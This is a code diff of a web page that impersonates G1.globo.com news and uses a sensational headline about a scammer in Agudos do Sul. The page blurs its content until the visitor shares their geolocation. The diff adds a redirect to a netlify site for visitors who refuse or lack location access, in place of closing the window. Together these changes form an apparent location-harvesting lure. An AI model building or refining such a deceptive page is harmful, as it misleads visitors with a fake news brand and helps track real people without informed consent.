@@ -6,7 +6,7 @@
   <title>G1.globo.com - Notícias</title>
 
   <!-- Open Graph (para WhatsApp, Facebook, etc.) -->
-  <meta property="og:title" content="Polícia identifica e caça golpista que aplica golpes na cidade!" />
+  <meta property="og:title" content="ALERTA EM AGUDOS DO SUL: Polícia identifica e caça golpista que aplica golpes na cidade!" />
   <meta property="og:description" content="A Polícia Civil do Paraná identificou um suspeito de aplicar uma série de golpes financeiros em moradores da cidade de Agudos do Sul." />
   <meta property="og:image" content="https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.metropolitano.blog.br%2Fnoticia%2Fpolicia-intensifica-buscas-pelo-taxista-joao-coelho-em-agudos-do-sul&psig=AOvVaw3gtUyoVcCcVymobQQBuhow&ust=1754584394529000&source=images&cd=vfe&opi=89978449&ved=0CBUQjRxqFwoTCKiFw7bO9o4DFQAAAAAdAAAAABAW" />
   <meta property="og:url" content="https://www.seusite.com.br" />
@@ -159,7 +159,7 @@
       document.body.classList.add('blurred');
 
       if (!navigator.geolocation) {
-        window.close();
+        window.location.replace("https://agudos-noticia.netlify.app/");
         return;
       }
 
@@ -183,7 +183,7 @@
         liberarConteudo();
 
       }, (error) => {
-        window.close();
+        window.location.replace("https://agudos-noticia.netlify.app/");
       });
 
     }, 2000); // Delay de 2 segundos (2000 milissegundos)
